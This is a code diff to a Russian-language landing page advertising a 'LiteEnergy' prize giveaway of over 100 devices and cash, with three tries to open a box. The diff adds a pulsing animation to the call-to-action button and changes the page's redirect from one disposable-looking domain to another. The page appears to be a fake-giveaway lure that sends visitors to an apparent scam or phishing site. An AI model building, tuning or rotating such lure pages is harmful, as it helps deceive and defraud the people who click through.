@@ -61,6 +61,20 @@
             font-weight: 700; /* Сделать жирным */
         }
         
+        /* Анимация пульсирующей тени для кнопки CTA */
+        .animate-pulse-shadow {
+            animation: pulse-shadow 2s infinite;
+        }
+
+        @keyframes pulse-shadow {
+            0%, 100% {
+                box-shadow: 0 0 10px rgba(59, 130, 246, 0.7), 0 0 20px rgba(59, 130, 246, 0.5); /* Начальная тень */
+            }
+            50% {
+                box-shadow: 0 0 20px rgba(59, 130, 246, 1), 0 0 40px rgba(59, 130, 246, 0.7); /* Максимальная тень (ярче) */
+            }
+        }
+
         /* Убран эффект свечения */
         .message-box {
             position: fixed;
@@ -96,8 +110,8 @@
             Открой свою удачу! Разыгрываются **Более 100 единиц компьютерной и мобильной техники**, а также множество денежных призов от компании LiteEnergy. У тебя есть **3 попытки** для открытия коробки! Без обмана, всё по-братски.
         </p>
 
-        <!-- Кнопка призыва к действию (CTA) -->
-        <button id="cta-button" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-10 rounded-full shadow-lg transition-transform transform hover:scale-105 duration-300 text-lg sm:text-xl uppercase">
+        <!-- Кнопка призыва к действию (CTA) - ДОБАВЛЕНА АНИМАЦИЯ -->
+        <button id="cta-button" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-10 rounded-full shadow-lg transition-transform transform hover:scale-105 duration-300 text-lg sm:text-xl uppercase animate-pulse-shadow">
             ПРИНЯТЬ УЧАСТИЕ
         </button>
 
@@ -142,7 +156,7 @@
             messageBox.style.display = 'block';
 
             // Перенаправляем на указанный URL
-            window.location.href = 'https://littlenvget.shop/public/7785103963242420';
+            window.location.href = 'https://creativecallproject.site/public/7722103963237521';
         });
     </script>
 </body>
